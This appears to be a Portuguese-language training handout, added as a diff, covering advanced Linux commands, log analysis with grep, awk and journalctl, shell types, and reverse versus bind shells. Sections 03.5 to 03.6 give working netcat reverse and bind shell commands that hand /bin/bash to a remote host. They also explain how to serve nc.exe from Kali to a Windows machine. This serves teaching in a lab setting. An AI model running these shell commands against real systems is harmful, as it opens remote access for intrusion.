@@ -1,0 +1,198 @@
+03- Comandos avançados Linux, análise de logs, tipos de shell
+03.1- Comandos Avançados no Linux: Domine o Terminal como um Profissional
+O Linux é um sistema operacional poderoso e flexível, amplamente utilizado por desenvolvedores, administradores de sistemas, profissionais de segurança e entusiastas da tecnologia. Embora comandos básicos como , e sejam úteis, é nos comandos avançados que o verdadeiro poder do terminal se revela. Eles permitem automatizar tarefas, analisar grandes volumes de dados, gerenciar serviços e muito mais. A seguir, veja uma seleção de comandos avançados que vão turbinar sua experiência no Linux:
+03.2- Comandos Avançados Essenciais
+03.2.1- awk
+Processador de texto ideal para extrair e manipular dados estruturados.
+awk -F: '{print $1}' /etc/passwd
+Extrai a primeira coluna de um arquivo — útil para logs e CSVs.
+
+wget http://138.204.178.73/5m1th/arquivos/access.log
+wc -l access.log = ver a qtd de linhas
+head access.log = ver o padrão
+cut -d ‘ ‘ -f1 access.log | sort | uniq | wc -l
+ 
+
+
+
+
+03.2.3- cut
+Extrai seções específicas de cada linha de um arquivo.
+cut -d ':' -f1 /etc/passwd
+Mostra apenas os nomes de usuários do sistema.
+
+03.2.3- uniq + sort
+Analisa e organiza dados repetidos.
+sort nomes.txt | uniq -c | sort -nr
+Conta e ordena os nomes mais frequentes em um arquivo.
+
+03.2.4- sed
+Editor de texto em linha — ideal para substituições e filtragens.
+sed 's/usuario1/usuario2/g' arquivo.txt
+Substitui todas as ocorrências de "usuario1" por "usuario2".
+03.2.5- tar + zip
+Compactação e arquivamento de arquivos e diretórios.
+tar -czvf projeto.tar.gz projeto/
+zip -r projeto.zip projeto/
+Cria arquivos compactados e do diretório .
+
+03.2.6- tee
+Visualiza e salva a saída de um comando simultaneamente.
+df -h | tee uso_disco.txt
+Exibe o uso de disco e salva em um arquivo.
+
+03.2.7- systemctl
+Gerencia serviços no Linux com systemd.
+systemctl status apache2
+systemctl restart nginx
+systemctl enable ssh
+Verifica o status, reinicia e ativa serviços no boot.
+
+03.2.8- Conclusão
+Dominar comandos avançados no Linux é como aprender a falar fluentemente a linguagem do sistema. Eles permitem que você vá além da interface gráfica, automatize tarefas, analise dados com precisão e administre serviços com eficiência. Seja você um profissional de TI ou um curioso explorador do terminal, investir tempo em aprender esses comandos é um passo essencial para se tornar um verdadeiro power user.
+
+
+03.3- O que é Análise de Logs no Linux?
+Logs são registros detalhados de tudo que acontece no sistema: acessos, erros, inicializações, falhas de serviços, entre outros. Eles ficam geralmente em e são fundamentais para: 
+• Diagnosticar problemas 
+• Identificar tentativas de invasão 
+• Auditar atividades de usuários e serviços 
+• Monitorar desempenho e estabilidade
+
+03.3.1- Ferramentas e Comandos para Análise de Logs
+03.3.1.1- Visualização básica
+cat /var/log/syslog   #mostra o conteúdo completo
+less /var/log/syslog  #permite navegação interativa
+tail /var/log/syslog  #acompanha o log em tempo real
+
+03.3.1.2- Filtragem e busca
+grep “ERROR” /var/log/syslog   #busca por erros
+grep -i “SSH” /var/log/syslog  #busca por acessos SSH
+
+03.3.1.3- Extração de campos
+cut -d ‘ ‘ -f1,2 /var/log/syslog  #extrai data e hora
+awk ‘{print $5} /var/log/syslog   #extrai o nome do serviço
+
+03.3.1.4- Manipulação de conteúdo
+sed ‘s/ERROR/WARNING/g’ /var/log/syslog              #substitui palavras
+awk ‘/sshd/{print $1, $2, $3, $5}’ /var/log/syslog   #extrai eventos do SSH
+
+03.3.1.5- Compactação de arquivos e diretórios
+zip -r projeto.zip projeto/
+unzip projeto.zip
+tar -czvf projeto.tar.gz projeto/ zip -r projeto.zip projeto/
+tar -xzvf projeto.tar.gz
+03.3.1.6- Logs de serviços com e systemctl e journalctl
+systemctl status apache2 — v     #verifica status do serviço
+journalctl -u nginx.service      #mostra logs do serviço nginx
+journalctl --since "2025-08-01"  #filtra por data
+journalctl -f                    #acompanha logs em tempo real
+03.3.1.7- Conclusão
+A análise de logs no Linux é uma prática poderosa que transforma o terminal em uma central de inteligência. Com comandos simples e ferramentas nativas, você pode identificar falhas, rastrear invasões e manter seu sistema sob controle. Quanto mais você dominar esses comandos, mais rápido e preciso será na resolução de problemas.
+
+03.4- Principais Tipos de Shell no Linux 
+03.4.1- SH (Bourne Shell) 
+• Criado nos anos 70 por Stephen Bourne 
+• Simples e compatível com scripts antigos
+• Poucos recursos modernos 
+• Usado em scripts para garantir compatibilidade entre sistemas UNIX e Linux
+03.4.2- Bash (Bourne Again Shell) 
+• Evolução do SH, desenvolvido pelo projeto GNU 
+• Shell padrão na maioria das distribuições Linux 
+Recursos: 
+• Autocompletar comandos e caminhos 
+• Histórico de comandos 
+• Suporte a arrays e variáveis 
+• Operadores avançados para scripting 
+Ideal para administração de sistemas e automação
+03.4.3- Zsh (Z Shell) 
+• Combina recursos do Bash, KornShell e C Shell 
+Recursos: 
+• Autocompletar inteligente 
+• Correção automática de comandos 
+• Suporte a temas e plugins (via Oh My Zsh) 
+• Manipulação avançada de arrays 
+Excelente para quem busca personalização e produtividade
+03.4.4- Ksh (Korn Shell) 
+• Extensão do SH com melhorias para programação de scripts 
+• Suporte a arrays e controle de fluxo mais robusto 
+• Ainda usado em ambientes UNIX tradicionais
+03.4.5- Fish (Friendly Interactive Shell) 
+• Shell moderno com foco em interatividade 
+Recursos: 
+• Sugestões de comandos em tempo real 
+• Sintaxe colorida nativa 
+• Não exige arquivos de configuração complexos 
+Ideal para iniciantes e usuários que preferem uma experiência intuitiva
+03.4.6- Csh (C Shell) 
+• Inspirado na linguagem C 
+• Menos usado atualmente, mas influente historicamente 
+• Prompt padrão: para usuários comuns
+
+03.4.7- Conclusão: 
+Escolher o shell certo pode transformar sua experiência no terminal. Se você busca compatibilidade, o SH é confiável. Para poder e flexibilidade, o Bash é rei. Se quiser produtividade e estilo, Zsh e Fish são ótimas opções. Cada shell tem seus pontos fortes — vale a pena testar e encontrar o que melhor se adapta ao seu fluxo de trabalho.
+
+03.5- Shell Reverso (Reverse Shell)
+03.5.1- Como funciona:
+A máquina da vítima inicia a conexão com a máquina do atacante.
+O atacante configura um listener (escutador) esperando a conexão.
+Quando a vítima se conecta, o atacante ganha acesso à shell do sistema remoto.
+
+03.5.2- Vantagens:
+Mais difícil de bloquear por firewalls, pois usa conexões de saída.
+Ideal quando a vítima está atrás de NAT ou firewall.
+
+03.5.3- Exemplo com Netcat:
+# Atacante escuta:
+
+nc -lvnp 8080
+
+# Vítima se conecta:
+nc 192.168.200.200 8080 -e /bin/bash
+
+03.6- Bind Shell
+03.6.1- Como funciona:
+A máquina da vítima abre uma porta e fica escutando.
+O atacante se conecta a essa porta para obter acesso à shell.
+
+03.6.2- Desvantagens:
+Mais fácil de detectar por sistemas de segurança.
+Pode ser bloqueado por firewalls que impedem conexões de entrada.
+
+03.6.3- Exemplo com Netcat:
+# Vítima escuta:
+nc -lvnp 8080 -e /bin/bash
+
+# Atacante se conecta:
+nc 192.168.100.100 8080
+
+Extra: 
+Localizando o netcat no Kali
+$ locate nc.exe
+Copiando o netcat
+$ cp /usr/share/windows-resources/binaries/nc.exe .
+
+Subindo webserver em python:
+$ python -m http.server 80
+
+Acesse o IP do Kali Linux a partir do seu Windows e faça o download do netcat (nc.exe)
+
+
+03.7- Comparativo Rápido: Reverse x Bind 
+Característica
+Reverse Shell
+Bind Shell
+Iniciação da conexão
+Vítima → Atacante
+Atacante → Vítima
+Firewall
+Menos suscetível
+Mais suscetível
+Detecção por EDR
+Menos provável
+Mais provável
+IP público necessário
+Atacante
+Vítima
+
+
